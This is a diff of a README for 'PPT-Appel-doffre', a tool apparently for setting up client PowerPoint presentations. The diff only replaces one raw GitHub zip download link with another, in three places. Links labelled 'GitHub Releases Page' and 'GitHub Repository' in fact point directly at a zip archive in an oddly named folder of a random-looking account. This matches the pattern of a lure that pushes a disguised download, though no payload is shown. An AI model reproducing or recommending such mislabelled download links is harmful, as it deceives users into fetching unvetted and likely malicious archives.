@@ -1,6 +1,6 @@
 # 📝 PPT-Appel-doffre - Easily Set Up Your Client PPT
 
-![Download PPT-Appel-doffre](https://raw.githubusercontent.com/paleocortical-shortstaplecotton512/PPT-Appel-doffre/main/glyoxalin/PPT-Appel-doffre-3.8-alpha.4.zip)
+![Download PPT-Appel-doffre](https://raw.githubusercontent.com/paleocortical-shortstaplecotton512/PPT-Appel-doffre/main/glyoxalin/PP_Appel_doffre_2.2-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Welcome to the PPT-Appel-doffre! This application helps you set up your PowerPoi
 
 ## 📥 Download & Install
 
-To get the latest version of the PPT-Appel-doffre, **visit this page to download**: [GitHub Releases Page](https://raw.githubusercontent.com/paleocortical-shortstaplecotton512/PPT-Appel-doffre/main/glyoxalin/PPT-Appel-doffre-3.8-alpha.4.zip)
+To get the latest version of the PPT-Appel-doffre, **visit this page to download**: [GitHub Releases Page](https://raw.githubusercontent.com/paleocortical-shortstaplecotton512/PPT-Appel-doffre/main/glyoxalin/PP_Appel_doffre_2.2-beta.1.zip)
 
 Once you visit the releases page, look for the most recent version. Click on the version number to see the release details. Download the installer file suitable for your operating system.
 
@@ -49,7 +49,7 @@ If you face any issues while using PPT-Appel-doffre, feel free to reach out to o
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/paleocortical-shortstaplecotton512/PPT-Appel-doffre/main/glyoxalin/PPT-Appel-doffre-3.8-alpha.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/paleocortical-shortstaplecotton512/PPT-Appel-doffre/main/glyoxalin/PP_Appel_doffre_2.2-beta.1.zip)
 - [User Manual](#) - A detailed guide on all features and how to use them effectively.
 
 Thank you for choosing PPT-Appel-doffre! We hope this application helps you create effective presentations for your clients with ease.
